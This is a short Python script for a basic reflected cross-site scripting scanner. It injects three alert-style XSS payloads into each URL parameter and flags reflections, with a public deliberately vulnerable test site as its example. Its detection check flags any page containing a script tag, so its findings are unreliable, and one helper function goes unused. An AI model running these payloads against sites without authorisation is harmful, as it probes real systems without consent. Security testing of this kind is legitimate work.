import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

class SimpleXSSScanner:

    def __init__(self):
        self.session = requests.Session()

        self.payloads = [
            "<script>alert('XSS1')</script>",
            "\"><script>alert('XSS1')</script>",
            "<img src=x onerror=alert('XSS1')>"
        ]

    def scan_url(self, url):

        print(f"\nScanning: {url}")

        parsed = urlparse(url)

        # Extract parameters
        params = parse_qs(parsed.query)

        if not params:
            print("No parameters found.")
            return

        for param in params:

            print(f"\nTesting parameter: {param}")

            for payload in self.payloads:

                test_params = params.copy()
                test_params[param] = payload

                new_query = urlencode(test_params, doseq=True)

                test_url = urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    new_query,
                    parsed.fragment
                ))

                print(f"Injecting payload: {payload}")

                response = self.session.get(test_url)

                if "<script>" in response.text or "XSS1" in response.text:

                    print("\n🚨 XSS VULNERABILITY FOUND!")
                    print("URL:", test_url)
                    print("Payload:", payload)
                    return

        print("No XSS detected.")

    def detect_xss(self, html, payload):

        soup = BeautifulSoup(html, "html.parser")

        if payload in soup.prettify():
            return True

        return False


if __name__ == "__main__":

    scanner = SimpleXSSScanner()

    target = input("Enter URL with parameter (example: http://testphp.vulnweb.com/search.php?test=1): ")

    scanner.scan_url(target)